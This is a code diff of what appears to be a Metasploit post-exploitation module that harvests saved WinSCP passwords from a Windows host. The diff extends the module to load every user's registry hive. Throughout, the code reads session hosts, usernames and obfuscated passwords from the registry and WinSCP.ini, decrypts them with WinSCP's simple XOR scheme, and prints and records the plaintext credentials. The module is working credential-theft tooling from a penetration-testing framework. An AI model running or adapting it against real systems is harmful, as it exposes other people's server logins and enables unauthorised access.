@@ -15,21 +15,22 @@ require 'msf/core'
 require 'rex'
 require 'msf/core/post/windows/registry'
 require 'rex/parser/ini'
-
+require 'msf/core/post/windows/user_profiles'
 
 class Metasploit3 < Msf::Post
 	include Msf::Post::Windows::Registry
 	include Msf::Auxiliary::Report
+	include Msf::Post::Windows::UserProfiles
 
 	def initialize(info={})
 		super( update_info( info,
 				'Name'          => 'Windows Gather WinSCP Saved Password Extraction',
-				'Description'   => %q{ This module extracts weakly encrypted
-							saved passwords from WinSCP. It
-							searches for saved sessions in the
-							Windows Registry and the WinSCP.ini
-							file. It cannot decrypt passwords
-							if a master password is used.},
+				'Description'   => %q{
+					This module extracts weakly encrypted saved passwords from
+					WinSCP. It searches for saved sessions in the Windows Registry
+					and the WinSCP.ini file. It cannot decrypt passwords if a master
+					password is used.
+					},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'TheLightCosine <thelightcosine[at]gmail.com>'],
 				'Platform'      => [ 'windows' ],
@@ -39,47 +40,53 @@ class Metasploit3 < Msf::Post
 	end
 
 	def get_reg
-		#Enumerate all the SID in HKEY_Users and see if any of them have WinSCP RegistryKeys. 
+		# Enumerate all the SID in HKEY_Users and see if any of them have WinSCP RegistryKeys.
 		regexists = 0
-		registry_enumkeys('HKU').each do |k|
-			masterpw = registry_getvaldata("HKU\\#{k}\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security", 'UseMasterPassword')
+
+		userhives=load_missing_hives()
+		userhives.each do |hive|
+			next if hive['HKU'] == nil
+			master_key = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security"
+			masterpw = registry_getvaldata(master_key, 'UseMasterPassword')
 			
-			if masterpw == nil
-				#No WinSCP Keys here
-				next
-			end
+			#No WinSCP Keys here
+			next if masterpw.nil?
+				
+			
 			regexists = 1
 			if masterpw == 1
-				#Master Password used to add AES256 encryption to stored password
-				print_status("User #{k} is using a Master Password, cannot recover passwords")
+				# Master Password used to add AES256 encryption to stored password
+				print_status("User #{hive['HKU']} is using a Master Password, cannot recover passwords")
 				next
 
 			else
-				#Take a look at any saved sessions
+				# Take a look at any saved sessions
 				savedpwds = 0
-				registry_enumkeys("HKU\\#{k}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions").each do |session|
-					#Skip default settings entry
-					if session == "Default%20Settings"
-						next
-					end					
-					
-					password = registry_getvaldata("HKU\\#{k}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\#{session}", 'Password')
-					if password == nil
-						#There is no password saved for this session, so we skip it
-						next
-					end
+				session_key = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions"
+				saved_sessions = registry_enumkeys(session_key)
+				next if saved_sessions.nil?
+				saved_sessions.each do |saved_session|
+					# Skip default settings entry
+					next if saved_session == "Default%20Settings"
+
+					active_session = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\#{saved_session}"
+					password = registry_getvaldata(active_session, 'Password')
+					# There is no password saved for this session, so we skip it
+					next if password == nil
+				
 					savedpwds = 1
-					portnum = registry_getvaldata("HKU\\#{k}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\#{session}", 'PortNumber')
+					portnum = registry_getvaldata(active_session, 'PortNumber')
 					if portnum == nil
-						#If no explicit port number entry exists, it is set to default port of tcp22
+						# If no explicit port number entry exists, it is set to default port of tcp22
 						portnum = 22
 					end
 					
-					user = registry_getvaldata("HKU\\#{k}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\#{session}", 'UserName')
-					host = registry_getvaldata("HKU\\#{k}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\#{session}", 'HostName')
-					proto = registry_getvaldata("HKU\\#{k}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\#{session}", 'FSProtocol')
+					user = registry_getvaldata(active_session, 'UserName')
+					host = registry_getvaldata(active_session, 'HostName')
+					proto = registry_getvaldata(active_session, 'FSProtocol')
 
-					#If no explicit protocol entry exists it is on sFTP with SCP backup. If it is 0 it is set to SCP.
+					# If no explicit protocol entry exists it is on sFTP with SCP backup. If it is 0
+					# it is set to SCP.
 					if proto == nil or proto == 0
 						proto = "SCP"					
 					else 
@@ -110,6 +117,7 @@ class Metasploit3 < Msf::Post
 		if regexists == 0
 			print_status("No WinSCP Registry Keys found!")
 		end
+		unload_our_hives(userhives)
 
 	end
 
@@ -117,7 +125,7 @@ class Metasploit3 < Msf::Post
 	def get_ini(filename)
 		begin
 			#opens the WinSCP.ini file for reading and loads it into the MSF Ini Parser
-			iniexists = client.fs.file.stat(filename)
+			client.fs.file.stat(filename)
 			config = client.fs.file.new(filename,'r')
 			parse = config.read
 			print_status("Found WinSCP.ini file...")
@@ -135,7 +143,7 @@ class Metasploit3 < Msf::Post
 				if group=~/#{groupkey}/
 					#See if we have a password saved in this sessions
 					if ini[group].has_key?('Password')
-						#If no explicit port number is defined, then it is the default tcp22
+						# If no explicit port number is defined, then it is the default tcp 22
 						if ini[group].has_key?('PortNumber')
 							portnum = ini[group]['PortNumber']
 						else
@@ -145,13 +153,14 @@ class Metasploit3 < Msf::Post
 						user= ini[group]['UserName']
 						proto = ini[group]['FSProtocol']
 
-						#If no explicit protocol entry exists it is on sFTP with SCP backup. If it is 0 it is set to SCP.
+						# If no explicit protocol entry exists it is on sFTP with SCP backup. If it
+						# is 0 it is set to SCP.
 						if proto == nil or proto == 0
 							proto = "SCP"					
 						else 
 							proto = "FTP"
 						end
-						#Decrypt the password and report on all of the results
+						# Decrypt the password and report on all of the results
 						pass= decrypt_password(ini[group]['Password'], user+host)
 						print_status("Host: #{host}  Port: #{portnum} Protocol: #{proto}  Username: #{user}  Password: #{pass}")
 						report_auth_info(
@@ -174,17 +183,19 @@ class Metasploit3 < Msf::Post
 		pwalg_simple_magic = 0xA3
 		pwalg_simple_string = "0123456789ABCDEF"
 		
-		#Decrypts the next charachter in the password sequence
+		# Decrypts the next charachter in the password sequence
 		if @password.length > 0
-			#Takes the first char from the encrypted password and finds its position in the pre-defined string, then left shifts the returned index by 4 bits
+			# Takes the first char from the encrypted password and finds its position in the
+			# pre-defined string, then left shifts the returned index by 4 bits
 			unpack1 = pwalg_simple_string.index(@password[0,1])
 			unpack1= unpack1 << 4
 			
-			#Takes the second char from the encrypted password and finds its position in the pre-defined string
+			# Takes the second char from the encrypted password and finds its position in the
+			# pre-defined string
 			unpack2 = pwalg_simple_string.index(@password[1,1])
-			#Adds the two results, XORs against 0xA3, NOTs it and then ands it with 0xFF
+			# Adds the two results, XORs against 0xA3, NOTs it and then ands it with 0xFF
 			result= ~((unpack1+unpack2) ^ pwalg_simple_magic) & 0xff
-			#Strips the first two chars off and returns our result
+			# Strips the first two chars off and returns our result
 			@password = @password[2,@password.length]
 			return result
 		end
